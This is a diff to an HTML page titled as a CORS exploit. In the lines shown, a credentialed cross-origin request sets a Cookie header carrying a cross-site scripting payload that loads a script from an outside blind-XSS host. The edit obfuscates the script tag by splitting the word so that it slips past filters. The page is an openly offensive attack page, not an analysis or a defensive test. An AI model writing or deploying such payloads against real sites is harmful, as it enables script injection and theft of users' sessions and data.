@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS333 Exploit with Cookie</title>
+    <title>CORS44 Exploit with Cookie</title>
 </head>
 <body>
     <h1>CORS Exploit with Custom Cookie</h1>
@@ -23,7 +23,8 @@
             xhr.open('GET', url, true);
             xhr.withCredentials = true;
             
-            var cookieValue = 'turbo-cdn="><script src=//naysser.bxss.in></script>"';
+            // Escape characters in the cookie value
+            var cookieValue = 'turbo-cdn="><scr"+"ipt src="//naysser.bxss.in"></scr"+"ipt>"';
             xhr.setRequestHeader('Cookie', cookieValue);
             
             xhr.send();
